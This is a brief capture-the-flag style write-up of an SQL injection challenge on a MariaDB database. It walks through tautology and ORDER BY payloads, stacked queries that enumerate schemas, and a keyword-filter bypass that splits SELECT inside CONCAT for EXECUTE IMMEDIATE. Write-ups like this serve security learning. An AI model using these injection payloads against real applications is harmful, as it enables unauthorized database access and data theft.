### Basic Payload

`1' or '1'='1`

### Finding Number of Columns

`1' ORDER BY 2 -- -`: No error 

`1' ORDER BY 3 -- -`: error 1054 : Unknown column '3' in 'order clause'

So there are 2 columns

### Stacked Queries

Many keywords, such as SELECT and UNION, are filtered out by regex. However, it appears stacked queries are allowed.

`1'; SHOW DATABASES;`

`1'; DESCRIBE words;`

``1'; DESCRIBE `1919810931114514`;``

`1'; USE information_schema; SHOW TABLES;`

`1'; SHOW PROCEDURE STATUS; SHOW FUNCTION STATUS;`

### Execute Immediate

Unlike MySQL, MariaDB supports the `EXECUTE IMMEDIATE` command which will execute a string as an SQL query.

`1';EXECUTE IMMEDIATE CONCAT('SEL', 'ECT * FROM words');`

``1';EXECUTE IMMEDIATE CONCAT('SEL', 'ECT * FROM `1919810931114514`');``

Note the backticks around 1919810931114514, they are needed to prevent the table name from being interpreted as a number.
